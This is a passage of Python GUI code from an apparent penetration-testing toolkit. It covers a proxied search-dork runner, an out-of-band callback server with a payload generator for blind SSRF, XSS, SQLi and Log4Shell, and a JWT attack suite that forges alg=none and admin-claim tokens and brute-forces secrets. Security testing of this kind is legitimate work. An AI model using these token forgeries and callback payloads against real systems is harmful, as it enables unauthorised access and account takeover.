                        self._rlog(f"  ⏸  {d:<53}  rate-limited (429)", 'warn'))
                    _time.sleep(delay * 3)  # back-off
                    continue

                if only_200 and status != 200:
                    stats['skip'] += 1
                    self.root.after(0, lambda d=dork[:52], s=status:
                        self._rlog(f"  ⏭  {d:<53}  HTTP {s}", 'dim'))
                    _time.sleep(delay)
                    continue

                # ── Extract links ──────────────────────────────────
                import re as _re
                links_raw = _re.findall(r'https?://[^\s"\'<>&]{12,}', body)
                links     = []
                seen_lnk  = set()
                for lnk in links_raw:
                    lnk = lnk.rstrip('.,);')
                    if lnk in seen_lnk: continue
                    seen_lnk.add(lnk)
                    if target in lnk:
                        links.append(lnk)
                    elif engine in ('github', 'shodan', 'censys'):
                        links.append(lnk)
                links = links[:6]

                results.append({
                    "engine": engine, "category": cat,
                    "dork": dork, "url": search_url,
                    "status": status, "links": links,
                })
                stats['ok']    += 1
                stats['links'] += len(links)

                # Format: ✅ [200] dork ──── N links [proxy_ip]
                n_links   = len(links)
                px_tag    = f"  [{prx['host'].split('.')[-2] + '.' + prx['host'].split('.')[-1] if prx and '.' in prx['host'] else (prx['host'][:10] if prx else '')}]" if prx else ""
                link_tag  = f"  🔗 {n_links}" if n_links else ""
                icon      = "✅" if n_links > 0 else "🔵"
                self.root.after(0, lambda d=dork[:52], s=status, lt=link_tag, pt=px_tag, ic=icon:
                    self._rlog(f"  {ic}  {d:<53}  [{s}]{lt}{pt}", 'ok' if lt else 'info'))
                for lnk in links:
                    self.root.after(0, lambda l=lnk:
                        self._rlog(f"       🔗  {l[:80]}", 'dim'))

                _time.sleep(delay)

            # ── Save results ───────────────────────────────────────
            proj     = self.project.get() or target
            proj_dir = LOGS_DIR / proj
            proj_dir.mkdir(parents=True, exist_ok=True)
            out_file = proj_dir / "dork_results.txt"
            out_json = proj_dir / "dork_results.json"

            try:
                with open(out_file, 'w', encoding='utf-8') as f:
                    f.write(f"# DORK RESULTS  —  {engine.upper()}  —  Target: {target}\n")
                    f.write(f"# Date:    {__import__('datetime').datetime.now().isoformat()}\n")
                    f.write(f"# Results: {len(results)}  |  Links: {stats['links']}\n")
                    f.write(f"# Skipped: {stats['skip']}  |  Failed: {stats['fail']}\n")
                    f.write(f"{'─'*65}\n\n")
                    last_cat = None
                    for r2 in results:
                        if r2['category'] != last_cat:
                            f.write(f"\n{'━'*65}\n  {r2['category']}\n{'━'*65}\n")
                            last_cat = r2['category']
                        f.write(f"\n  {r2['dork']}\n  Status: {r2['status']}\n")
                        for lnk in r2['links']:
                            f.write(f"    → {lnk}\n")
                with open(out_json, 'w', encoding='utf-8') as f:
                    _json.dump({
                        "meta": {"engine": engine, "target": target,
                                 "total": len(results), "stats": stats},
                        "results": results
                    }, f, indent=2)
            except Exception: pass

            self._dork_runner_results = results

            def _done():
                sep = "─" * 60
                self._rlog(f"  {sep}", 'dim')
                self._rlog(f"  ⬡  SCAN COMPLETE", 'info')
                self._rlog(f"  {sep}", 'dim')
                self._rlog(f"  ✅  Success  :  {stats['ok']}", 'ok')
                self._rlog(f"  🔗  Links    :  {stats['links']}", 'ok')
                self._rlog(f"  ⏭  Skipped  :  {stats['skip']}", 'dim')
                self._rlog(f"  ❌  Failed   :  {stats['fail']}", 'err' if stats['fail'] else 'dim')
                self._rlog(f"  {sep}", 'dim')
                self._rlog(f"  💾  {out_file}", 'ok')
                self._rlog(f"  📋  {out_json}", 'dim')
                self._runner_progress_lbl.config(
                    text=(f"  ✅  Done  │  "
                          f"OK:{stats['ok']}  Links:{stats['links']}  "
                          f"Skip:{stats['skip']}  Fail:{stats['fail']}  "
                          f"→  {out_file.name}"),
                    fg=GREEN)
                self.set_status(
                    f"Dork Runner done: {stats['ok']} hits, {stats['links']} links, {stats['fail']} failed",
                    GREEN if stats['ok'] else YELLOW)
                self._populate_dork_results()
                self._populate_dork_results()
            self.root.after(0, _done)

        threading.Thread(target=_run, daemon=True).start()

    # ─── DORK RESULTS TAB ──────────────────────────────────────────
    def _build_dork_results(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "DORK RESULTS — Links Found (HTTP 200)", "📊").pack(fill='x', pady=(0,8))
        # Filter bar
        fr = mk_frame(pad, bg=BG2); fr.pack(fill='x', pady=(0,8))
        tk.Label(fr, text="Filter:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._result_filter = tk.StringVar()
        mk_entry(fr, var=self._result_filter, w=30).pack(side='left', padx=8, ipady=3)
        self._result_filter.trace_add('write', lambda *_: self._populate_dork_results())
        mk_btn(fr, "🔄 Refresh", self._populate_dork_results, ACCENT, small=True).pack(side='left', padx=4)
        mk_btn(fr, "💾 Load from File", self._load_dork_results_file, FG2, small=True).pack(side='left', padx=4)

        # Stats
        self._dr_stats = tk.Label(pad, text="No results yet — run Dork Runner first", bg=BG2, fg=FG3, font=MONO_S)
        self._dr_stats.pack(anchor='w', pady=(0,6))

        # Results tree
        cols = ('Category','Dork','Status','Links')
        self._dr_tree = mk_tree(pad, columns=cols, show='headings', height=12)
        for c, w in [('Category',160),('Dork',360),('Status',70),('Links',60)]:
            self._dr_tree.heading(c, text=c, anchor='w')
            self._dr_tree.column(c, width=w, anchor='w')
        self._dr_tree.tag_configure('high',   foreground=GREEN, background=BG3)
        self._dr_tree.tag_configure('medium', foreground=CYAN, background=BG3)
        self._dr_tree.tag_configure('empty',  foreground=FG3, background=BG3)
        vsb = ttk.Scrollbar(pad, orient='vertical', command=self._dr_tree.yview)
        self._dr_tree.configure(yscrollcommand=vsb.set)
        tf = mk_frame(pad, bg=BG2); tf.pack(fill='both', expand=True)
        self._dr_tree.pack(side='left', fill='both', expand=True, in_=tf)
        vsb.pack(side='right', fill='y', in_=tf)

        # Link detail
        self._dr_detail = mk_stext(pad, h=8, bg=BG3, fg=GREEN)
        self._dr_detail.pack(fill='x', pady=(6,0))
        self._dr_tree.bind('<<TreeviewSelect>>', self._show_dork_result_detail)

        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x', pady=(6,0))
        mk_btn(bf, "📋 Copy All Links", self._copy_all_dork_links, ACCENT, small=True).pack(side='left', padx=4)
        mk_btn(bf, "💾 Save Links Only", self._save_dork_links_only, GREEN, small=True).pack(side='left', padx=4)
        mk_btn(bf, "🌐 Open in Browser", self._open_selected_dork_link, FG2, small=True).pack(side='left', padx=4)

        self._dork_runner_results = []

    def _populate_dork_results(self):
        if not hasattr(self, '_dr_tree'): return
        results = getattr(self, '_dork_runner_results', [])
        filt    = self._result_filter.get().lower() if hasattr(self, '_result_filter') else ""
        self._dr_tree.delete(*self._dr_tree.get_children())
        shown = 0
        for r in results:
            if filt and filt not in r.get('dork','').lower() and filt not in r.get('category','').lower(): continue
            n_links = len(r.get('links', []))
            tag     = 'high' if n_links >= 3 else ('medium' if n_links >= 1 else 'empty')
            self._dr_tree.insert('', 'end',
                values=(r.get('category','')[:30], r.get('dork','')[:60],
                        r.get('status',''), f"{n_links} links"),
                tags=(tag,), iid=str(id(r)))
            shown += 1
        total_links = sum(len(r.get('links',[])) for r in results)
        if hasattr(self, '_dr_stats'):
            self._dr_stats.config(
                text=f"Results: {shown}  |  Total links found: {total_links}  |  "
                     f"Filter: '{filt}' " if filt else f"Results: {shown}  |  Total links: {total_links}",
                fg=GREEN if results else FG3)

    def _show_dork_result_detail(self, _e=None):
        sel = self._dr_tree.selection()
        if not sel: return
        iid = sel[0]
        results = getattr(self, '_dork_runner_results', [])
        item = next((r for r in results if str(id(r)) == iid), None)
        if not item: return
        self._dr_detail.config(state='normal'); self._dr_detail.delete('1.0','end')
        self._dr_detail.insert('end', f"Category: {item.get('category','')}\n")
        self._dr_detail.insert('end', f"Dork:     {item.get('dork','')}\n")
        self._dr_detail.insert('end', f"Status:   {item.get('status','')}\n\n")
        links = item.get('links', [])
        if links:
            self._dr_detail.insert('end', f"Links ({len(links)}):\n")
            for lnk in links:
                self._dr_detail.insert('end', f"  → {lnk}\n")
        else:
            self._dr_detail.insert('end', "No links extracted from this result\n")
        self._dr_detail.config(state='disabled')

    def _copy_all_dork_links(self):
        results = getattr(self, '_dork_runner_results', [])
        all_links = [lnk for r in results for lnk in r.get('links', [])]
        if not all_links: return
        self.root.clipboard_clear(); self.root.clipboard_append('\n'.join(all_links))
        self.set_status(f"Copied {len(all_links)} links", GREEN)

    def _save_dork_links_only(self):
        results = getattr(self, '_dork_runner_results', [])
        all_links = list(set(lnk for r in results for lnk in r.get('links', [])))
        if not all_links: return
        proj = self.project.get() or "default"
        out  = LOGS_DIR / proj / "dork_links.txt"
        (LOGS_DIR / proj).mkdir(parents=True, exist_ok=True)
        with open(out, 'w') as f: f.write('\n'.join(all_links))
        self.set_status(f"Saved {len(all_links)} unique links → {out.name}", GREEN)

    def _open_selected_dork_link(self):
        sel = self._dr_tree.selection()
        if not sel: return
        iid = sel[0]
        results = getattr(self, '_dork_runner_results', [])
        item = next((r for r in results if str(id(r)) == iid), None)
        if item and item.get('links'):
            webbrowser.open(item['links'][0])

    def _load_dork_results_file(self):
        """Load previously saved dork_results.json."""
        import json as _json
        proj = self.project.get()
        if proj:
            default_path = LOGS_DIR / proj / "dork_results.json"
            if default_path.exists():
                with open(default_path) as f:
                    self._dork_runner_results = _json.load(f)
                self._populate_dork_results()
                self.set_status(f"Loaded {len(self._dork_runner_results)} results", GREEN)
                return
        path = filedialog.askopenfilename(filetypes=[("JSON","*.json"),("All","*.*")])
        if not path: return
        try:
            with open(path) as f:
                self._dork_runner_results = _json.load(f)
            self._populate_dork_results()
            self.set_status(f"Loaded {len(self._dork_runner_results)} results from {path}", GREEN)
        except Exception as e:
            messagebox.showerror("Load Error", str(e), parent=self.root)

    # ─────────────────────────────────────────────────────────────
    def _build_oast_tab(self, frame):
        from modules.advanced import oast_server as _oast
        frame.configure(bg=BG2)
        nb2 = ttk.Notebook(frame); nb2.pack(fill='both', expand=True)
        f1 = tk.Frame(nb2, bg=BG2); nb2.add(f1, text="  📡 Server Control  ")
        f2 = tk.Frame(nb2, bg=BG2); nb2.add(f2, text="  📥 Interactions  ")
        f3 = tk.Frame(nb2, bg=BG2); nb2.add(f3, text="  🧪 Payload Generator  ")
        self._oast_mod = _oast
        self._build_oast_control(f1)
        self._build_oast_interactions(f2)
        self._build_oast_payloads(f3)

    def _build_oast_control(self, frame):
        from modules.advanced import oast_server as _oast
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "OAST / COLLABORATOR SERVER", "📡").pack(fill='x', pady=(0,8))

        info = mk_card(pad, accent_top=True, accent_color=CYAN); info.pack(fill='x', pady=(0,10))
        tk.Label(info, text=(
            "  Out-of-band testing server (like Burp Collaborator) — Pure Python, no cloud needed\n"
            "  Detects: Blind SSRF  ·  Blind XSS  ·  Blind SQLi DNS  ·  Log4Shell  ·  CMDi\n"
            "  HTTP listener: port 8877  ·  DNS listener: port 5353"
        ), bg=BG3, fg=FG2, font=MONO_S, justify='left').pack(anchor='w', padx=12, pady=10)

        # Config row
        cfg_f = mk_frame(pad, bg=BG2); cfg_f.pack(fill='x', pady=(0,8))
        tk.Label(cfg_f, text="Listen IP:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._oast_host = tk.StringVar(value="0.0.0.0")
        mk_entry(cfg_f, var=self._oast_host, w=14).pack(side='left', padx=8, ipady=3)
        tk.Label(cfg_f, text="HTTP:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left', padx=(12,4))
        self._oast_http_port = tk.StringVar(value="8877")
        mk_entry(cfg_f, var=self._oast_http_port, w=6).pack(side='left', ipady=3)
        tk.Label(cfg_f, text="DNS:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left', padx=(12,4))
        self._oast_dns_port = tk.StringVar(value="5353")
        mk_entry(cfg_f, var=self._oast_dns_port, w=6).pack(side='left', ipady=3)

        # Status + URL display
        self._oast_status_lbl = tk.Label(pad, text="● STOPPED",
                                          bg=BG2, fg=RED, font=MONO_B)
        self._oast_status_lbl.pack(anchor='w', pady=(0,4))

        # Clickable URL card
        url_card = mk_card(pad); url_card.pack(fill='x', pady=(0,8))
        url_inner = mk_frame(url_card, bg=BG3); url_inner.pack(fill='x', padx=10, pady=8)
        tk.Label(url_inner, text="Listen URL:", bg=BG3, fg=FG3, font=MONO_S).pack(side='left')
        self._oast_url_var = tk.StringVar(value="Start server to get URL")
        url_entry = tk.Entry(url_inner, textvariable=self._oast_url_var,
                             bg=BG3, fg=CYAN, font=MONO_S,
                             relief='flat', bd=0,
                             state='readonly',
                             readonlybackground=BG3,
                             width=55)
        url_entry.pack(side='left', padx=8)
        def copy_url():
            u = self._oast_url_var.get()
            if u and 'Start' not in u:
                self.root.clipboard_clear()
                self.root.clipboard_append(u)
                self.root.update()
                self.set_status("OAST URL copied!", GREEN)
        mk_btn(url_inner, "📋 Copy", copy_url, CYAN, small=True).pack(side='left', padx=4)

        # Log terminal
        self._oast_log_txt = mk_stext(pad, h=13, bg=TERM_BG, fg=TERM_FG)
        self._oast_log_txt.pack(fill='both', expand=True, pady=(0,8))

        def _log(msg, tag='info'):
            colors = {'ok':GREEN,'info':CYAN,'warn':YELLOW,'err':RED,'dim':FG3}
            self._oast_log_txt.config(state='normal')
            self._oast_log_txt.insert('end', msg + '\n', tag)
            self._oast_log_txt.tag_config(tag, foreground=colors.get(tag, FG),
                                           font=(_MONO_FACE, 9))
            self._oast_log_txt.see('end')
            self._oast_log_txt.config(state='disabled')

        def start_oast():
            host = self._oast_host.get().strip() or "0.0.0.0"
            try:
                http_port = int(self._oast_http_port.get())
                dns_port  = int(self._oast_dns_port.get())
            except ValueError:
                self.set_status("Invalid port number", RED); return

            self._oast_log_txt.config(state='normal')
            self._oast_log_txt.delete('1.0', 'end')
            self._oast_log_txt.config(state='disabled')

            _log(f"[*] Starting OAST server...", 'info')
            r1 = _oast.start_http_listener(host, http_port, _log)
            r2 = _oast.start_dns_listener(host, dns_port, _log)

            if r1.get('ok') or r2.get('ok'):
                self._oast_status_lbl.config(
                    text=f"● RUNNING  HTTP:{http_port}  DNS:{dns_port}", fg=GREEN)

                # Get public IP and build proper URL
                def _get_ip():
                    try:
                        import urllib.request as _ur
                        pub_ip = _ur.urlopen(
                            "https://api.ipify.org", timeout=5).read().decode().strip()
                    except Exception:
                        # fallback: get local IP
                        import socket
                        try:
                            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                                s.connect(("8.8.8.8", 80))
                                pub_ip = s.getsockname()[0]
                        except Exception:
                            pub_ip = "127.0.0.1"

                    listen_url = f"http://{pub_ip}:{http_port}"

                    def _upd():
                        self._oast_url_var.set(f"{listen_url}/PAYLOAD_ID")
                        _log(f"[✓] HTTP Listener: {listen_url}", 'ok')
                        _log(f"[✓] DNS Listener:  {pub_ip}:{dns_port}", 'ok')
                        _log(f"", 'dim')
                        _log(f"[*] Your OAST URL:", 'info')
                        _log(f"    {listen_url}/PAYLOAD_ID", 'ok')
                        _log(f"", 'dim')
                        _log(f"[*] Inject this URL into target inputs", 'info')
                        _log(f"[*] HTTP callbacks → shown in Interactions tab", 'info')
                        _log(f"[*] DNS callbacks  → shown in Interactions tab", 'info')
                        _log(f"", 'dim')
                        _log(f"[*] Example SSRF payload:", 'dim')
                        _log(f"    {listen_url}/ssrf-test-001", 'dim')
                        self.set_status(f"OAST running: {listen_url}", GREEN)
                    self.root.after(0, _upd)

                import threading
                threading.Thread(target=_get_ip, daemon=True).start()
            else:
                err = f"HTTP:{r1.get('error','')} DNS:{r2.get('error','')}"
                self._oast_status_lbl.config(text=f"● ERROR: {err[:60]}", fg=RED)
                _log(f"[!] Failed to start: {err}", 'err')
                _log(f"[*] Try: sudo python main.py (port <1024 needs root)", 'warn')
                _log(f"[*] Or change ports to 8877/5353 (no root needed)", 'info')

        def stop_oast():
            _oast.stop_http_listener()
            self._oast_status_lbl.config(text="● STOPPED", fg=RED)
            self._oast_url_var.set("Start server to get URL")
            _log("[*] OAST server stopped", 'warn')
            self.set_status("OAST server stopped", YELLOW)

        def clear_interactions():
            _oast.clear_interactions()
            self._oast_log_txt.config(state='normal')
            self._oast_log_txt.delete('1.0', 'end')
            self._oast_log_txt.config(state='disabled')
            if hasattr(self, '_oast_tree'):
                self._oast_tree.delete(*self._oast_tree.get_children())
            self.set_status("OAST interactions cleared", GREEN)

        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x')
        mk_btn(bf, "▶ Start OAST Server", start_oast, GREEN).pack(side='left', padx=4, ipady=5)
        mk_btn(bf, "⬛ Stop",             stop_oast,  RED,   small=True).pack(side='left', padx=4)
        mk_btn(bf, "🗑 Clear All",        clear_interactions, FG3, small=True).pack(side='left', padx=4)

    def _build_oast_interactions(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "RECEIVED INTERACTIONS", "📥").pack(fill='x', pady=(0,8))
        info = mk_card(pad); info.pack(fill='x', pady=(0,8))
        tk.Label(info, text=(
            "  Shows all DNS/HTTP callbacks received by OAST server\n"
            "  Filter by Payload ID to track specific tests"
        ), bg=BG3, fg=FG2, font=MONO_S).pack(anchor='w', padx=12, pady=6)
        fr = mk_frame(pad, bg=BG2); fr.pack(fill='x', pady=(0,8))
        tk.Label(fr, text="Filter by ID:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._oast_filter = tk.StringVar()
        mk_entry(fr, var=self._oast_filter, w=20).pack(side='left', padx=8, ipady=3)
        mk_btn(fr, "🔄 Refresh", self._oast_refresh, GREEN, small=True).pack(side='left', padx=4)
        # Auto-refresh
        self._oast_auto_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(fr, text="Auto-refresh (3s)", variable=self._oast_auto_var).pack(side='left', padx=8)

        cols = ('ID','Type','Source IP','Payload ID','Data','Time')
        self._oast_tree = mk_tree(pad, columns=cols, show='headings', height=16)
        for c, w in [('ID',40),('Type',70),('Source IP',110),('Payload ID',120),('Data',320),('Time',130)]:
            self._oast_tree.heading(c, text=c, anchor='w')
            self._oast_tree.column(c, width=w, anchor='w')
        self._oast_tree.tag_configure('dns',  foreground=CYAN, background=BG3)
        self._oast_tree.tag_configure('http', foreground=GREEN, background=BG3)
        vsb = ttk.Scrollbar(pad, orient='vertical', command=self._oast_tree.yview)
        self._oast_tree.configure(yscrollcommand=vsb.set)
        tf = mk_frame(pad, bg=BG2); tf.pack(fill='both', expand=True)
        self._oast_tree.pack(side='left', fill='both', expand=True, in_=tf)
        vsb.pack(side='right', fill='y', in_=tf)
        # Detail panel
        self._oast_detail = mk_stext(pad, h=6, bg=BG3, fg=FG)
        self._oast_detail.pack(fill='x', pady=(6,0))
        self._oast_tree.bind('<<TreeviewSelect>>', self._oast_show_detail)
        self._oast_refresh()
        self._oast_auto_refresh()

    def _oast_auto_refresh(self):
        """Auto-refresh interactions every 3 seconds."""
        if hasattr(self, '_oast_auto_var') and self._oast_auto_var.get():
            self._oast_refresh()
        try:
            self.root.after(3000, self._oast_auto_refresh)
        except Exception:
            pass

    def _oast_refresh(self):
        from modules.advanced import oast_server as _oast
        pid = self._oast_filter.get().strip() if hasattr(self, '_oast_filter') else ""
        interactions = _oast.get_interactions(payload_id=pid if pid else None)
        if not hasattr(self, '_oast_tree'): return
        self._oast_tree.delete(*self._oast_tree.get_children())
        for i in reversed(interactions[-200:]):
            self._oast_tree.insert('', 'end', values=(
                i.get('id',''), i.get('type','').upper(),
                i.get('source_ip',''), i.get('payload_id',''),
                i.get('data','')[:60], i.get('timestamp','')[:19]
            ), tags=(i.get('type',''),))

    def _oast_show_detail(self, _e=None):
        sel = self._oast_tree.selection()
        if not sel: return
        vals = self._oast_tree.item(sel[0])['values']
        from modules.advanced import oast_server as _oast
        interactions = _oast.get_interactions()
        try:
            iid = int(vals[0])
            item = next((x for x in interactions if x.get('id') == iid), {})
        except Exception:
            item = {}
        self._oast_detail.config(state='normal')
        self._oast_detail.delete('1.0','end')
        import json as _json
        self._oast_detail.insert('end', _json.dumps(item, indent=2))
        self._oast_detail.config(state='disabled')

    def _build_oast_payloads(self, frame):
        from modules.advanced import oast_server as _oast
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "OAST PAYLOAD GENERATOR", "🧪").pack(fill='x', pady=(0,8))
        cfg_f = mk_frame(pad, bg=BG2); cfg_f.pack(fill='x', pady=(0,8))
        tk.Label(cfg_f, text="OAST Host:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._oast_pg_host = tk.StringVar(value="your-oast-server.com")
        mk_entry(cfg_f, var=self._oast_pg_host, w=30).pack(side='left', padx=8, ipady=3)
        self._oast_pid_var = tk.StringVar(value=_oast.generate_payload_id())
        tk.Label(cfg_f, text="Payload ID:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left', padx=(12,4))
        mk_entry(cfg_f, var=self._oast_pid_var, w=16).pack(side='left', ipady=3)
        mk_btn(cfg_f, "🔄 New ID", lambda: self._oast_pid_var.set(_oast.generate_payload_id()), FG3, small=True).pack(side='left', padx=4)
        mk_btn(cfg_f, "▶ Generate All Payloads", self._oast_generate_payloads, GREEN, small=True).pack(side='right', padx=4)
        self._oast_payload_txt = mk_stext(pad, h=28, bg=BG3, fg=GREEN)
        self._oast_payload_txt.pack(fill='both', expand=True, pady=(8,0))
        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x', pady=(6,0))
        mk_btn(bf, "📋 Copy All", lambda: (self.root.clipboard_clear(),
            self.root.clipboard_append(self._oast_payload_txt.get('1.0','end'))), ACCENT, small=True).pack(side='left', padx=4)

    def _oast_generate_payloads(self):
        from modules.advanced import oast_server as _oast
        host = self._oast_pg_host.get().strip()
        pid  = self._oast_pid_var.get().strip()
        if not host: return
        payloads = _oast.generate_payloads(host, pid)
        self._oast_payload_txt.config(state='normal')
        self._oast_payload_txt.delete('1.0','end')
        self._oast_payload_txt.insert('end', f"Payload ID: {pid}\n")
        self._oast_payload_txt.insert('end', f"OAST Host:  {host}\n\n")
        for category, items in payloads.items():
            self._oast_payload_txt.insert('end', f"{'='*50}\n{category.upper()} PAYLOADS\n{'='*50}\n")
            for key, val in items.items():
                self._oast_payload_txt.insert('end', f"\n[{key}]\n{val}\n")
            self._oast_payload_txt.insert('end', '\n')
        self._oast_payload_txt.config(state='disabled')

    # ═════════════════════════════════════════════════════════════
    #  JWT / OAUTH TAB
    # ═════════════════════════════════════════════════════════════
    def _build_jwt_oauth_tab(self, frame):
        frame.configure(bg=BG2)
        nb2 = ttk.Notebook(frame); nb2.pack(fill='both', expand=True)
        f1 = tk.Frame(nb2, bg=BG2); nb2.add(f1, text="  🔓 JWT Analyzer  ")
        f2 = tk.Frame(nb2, bg=BG2); nb2.add(f2, text="  ⚔ JWT Attacks  ")
        f3 = tk.Frame(nb2, bg=BG2); nb2.add(f3, text="  🔑 OAuth Analyzer  ")
        f4 = tk.Frame(nb2, bg=BG2); nb2.add(f4, text="  🍪 Session Analyzer  ")
        self._build_jwt_analyzer(f1)
        self._build_jwt_attacks(f2)
        self._build_oauth_analyzer(f3)
        self._build_session_analyzer(f4)

    def _build_jwt_analyzer(self, frame):
        from modules.advanced import jwt_oauth as _jwt
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "JWT DECODER & SECURITY ANALYZER", "🔓").pack(fill='x', pady=(0,8))
        tk.Label(pad, text="Paste JWT Token:", bg=BG2, fg=FG3, font=MONO_S).pack(anchor='w', pady=(0,4))
        self._jwt_input = tk.Text(pad, height=3, bg=BG3, fg=CYAN, font=MONO_S,
                                   relief='flat', insertbackground=ACCENT, wrap='none')
        self._jwt_input.pack(fill='x', pady=(0,8))
        mk_btn(pad, "🔍 Analyze JWT", self._jwt_analyze, GREEN).pack(anchor='w', pady=(0,8), ipady=5)
        self._jwt_result = mk_stext(pad, h=22, bg=BG3, fg=FG)
        self._jwt_result.pack(fill='both', expand=True)
        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x', pady=(6,0))
        mk_btn(bf, "📋 Copy", lambda: (self.root.clipboard_clear(),
            self.root.clipboard_append(self._jwt_result.get('1.0','end'))), ACCENT, small=True).pack(side='left', padx=4)

    def _jwt_analyze(self):
        from modules.advanced import jwt_oauth as _jwt
        token = self._jwt_input.get('1.0','end').strip()
        if not token: return
        r = _jwt.analyze_jwt_security(token)
        self._jwt_result.config(state='normal'); self._jwt_result.delete('1.0','end')
        if r.get('error'):
            self._jwt_result.insert('end', f"[!] Error: {r['error']}\n"); 
            self._jwt_result.config(state='disabled'); return
        dec = r.get('decoded', {})
        self._jwt_result.insert('end', "=== HEADER ===\n")
        import json as _json
        self._jwt_result.insert('end', _json.dumps(dec.get('header',{}), indent=2) + '\n\n')
        self._jwt_result.insert('end', "=== PAYLOAD ===\n")
        self._jwt_result.insert('end', _json.dumps(dec.get('payload',{}), indent=2) + '\n\n')
        self._jwt_result.insert('end', f"Algorithm: {dec.get('algorithm','')}\n\n")
        issues = r.get('issues', [])
        if issues:
            self._jwt_result.insert('end', f"=== SECURITY ISSUES ({len(issues)}) ===\n")
            for iss in issues:
                sev = iss.get('severity','INFO')
                icon = {'CRITICAL':'🔴','HIGH':'🟠','MEDIUM':'🟡','LOW':'🟢','INFO':'ℹ'}.get(sev,'•')
                self._jwt_result.insert('end', f"  {icon} [{sev}] {iss.get('issue','')}\n")
                if iss.get('test'): self._jwt_result.insert('end', f"      Test: {iss['test']}\n")
        self._jwt_result.insert('end', f"\n=== RECOMMENDED ATTACKS ===\n")
        for a in r.get('attacks_to_try', []):
            self._jwt_result.insert('end', f"  → {a}\n")
        self._jwt_result.config(state='disabled')
        self.set_status(f"JWT: {len(issues)} security issues found", RED if issues else GREEN)

    def _build_jwt_attacks(self, frame):
        from modules.advanced import jwt_oauth as _jwt
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "JWT ATTACK SUITE", "⚔").pack(fill='x', pady=(0,8))
        tk.Label(pad, text="JWT Token:", bg=BG2, fg=FG3, font=MONO_S).pack(anchor='w', pady=(0,2))
        self._jatk_token = tk.Text(pad, height=2, bg=BG3, fg=CYAN, font=MONO_S,
                                    relief='flat', insertbackground=ACCENT, wrap='none')
        self._jatk_token.pack(fill='x', pady=(0,8))
        # Payload override
        po_f = mk_frame(pad, bg=BG2); po_f.pack(fill='x', pady=(0,8))
        tk.Label(po_f, text="Override claims (JSON):", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._jatk_claims = tk.StringVar(value='{"role":"admin","admin":true,"sub":"admin"}')
        mk_entry(po_f, var=self._jatk_claims, w=50).pack(side='left', padx=8, ipady=3)
        # Secret for HMAC
        sec_f = mk_frame(pad, bg=BG2); sec_f.pack(fill='x', pady=(0,8))
        tk.Label(sec_f, text="HMAC Secret (optional):", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._jatk_secret = tk.StringVar()
        mk_entry(sec_f, var=self._jatk_secret, w=30).pack(side='left', padx=8, ipady=3)
        # Attack buttons
        atk_f = mk_frame(pad, bg=BG2); atk_f.pack(fill='x', pady=(0,8))
        for label, func, clr in [
            ("🔓 alg=none", lambda: self._jwt_attack('none'), RED),
            ("🔑 Weak Secret Brute", lambda: self._jwt_attack('brute'), ORANGE),
            ("⚡ Forge Payload", lambda: self._jwt_attack('forge'), YELLOW),
            ("🔄 RS256→HS256", lambda: self._jwt_attack('rs256'), PURPLE),
        ]:
            mk_btn(atk_f, label, func, clr, small=True).pack(side='left', padx=4)
        self._jatk_result = mk_stext(pad, h=20, bg=BG3, fg=GREEN)
        self._jatk_result.pack(fill='both', expand=True)
        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x', pady=(6,0))
        mk_btn(bf, "📋 Copy Forged Token", lambda: (
            self.root.clipboard_clear(),
            self.root.clipboard_append(self._jatk_result.get('1.0','end').split('\n')[0])),
               RED, small=True).pack(side='left', padx=4)

    def _jwt_attack(self, attack: str):
        from modules.advanced import jwt_oauth as _jwt
        import json as _json
        token = self._jatk_token.get('1.0','end').strip()
        if not token: return
        self._jatk_result.config(state='normal'); self._jatk_result.delete('1.0','end')
        if attack == 'none':
            r = _jwt.attack_alg_none(token)
            if r.get('error'): self._jatk_result.insert('end', f"Error: {r['error']}\n")
            else:
                self._jatk_result.insert('end', "=== ALG=NONE FORGED TOKENS ===\n\n")
                for t in r.get('tokens', []):
                    self._jatk_result.insert('end', f"[{t['alg']}]\n{t['token']}\n\n")
        elif attack == 'brute':
            self._jatk_result.insert('end', "[*] Brute-forcing secret...\n\n")
            self._jatk_result.config(state='disabled')
            def _go():
                r = _jwt.attack_weak_secret(token)
                def _upd():
                    self._jatk_result.config(state='normal')
                    if r.get('found'):
                        self._jatk_result.insert('end', f"🔴 SECRET FOUND: {r['secret']}\n\n")
                        self._jatk_result.insert('end', f"Algorithm: {r['algorithm']}\n")
                        forged = _jwt.forge_payload(token, _json.loads(self._jatk_claims.get()), r['secret'])
                        self._jatk_result.insert('end', f"\nForged admin token:\n{forged.get('token','')}\n")
                    else:
                        self._jatk_result.insert('end', f"[~] Not found in {r.get('tested',0)} common secrets\n")
                        self._jatk_result.insert('end', f"Try: hashcat -a 0 -m 16500 token.txt rockyou.txt\n")
                    self._jatk_result.config(state='disabled')
                self.root.after(0, _upd)
            threading.Thread(target=_go, daemon=True).start()
            return
        elif attack == 'forge':
            try: claims = _json.loads(self._jatk_claims.get())
            except Exception: claims = {"role": "admin"}
            secret = self._jatk_secret.get().strip()
            r = _jwt.forge_payload(token, claims, secret)
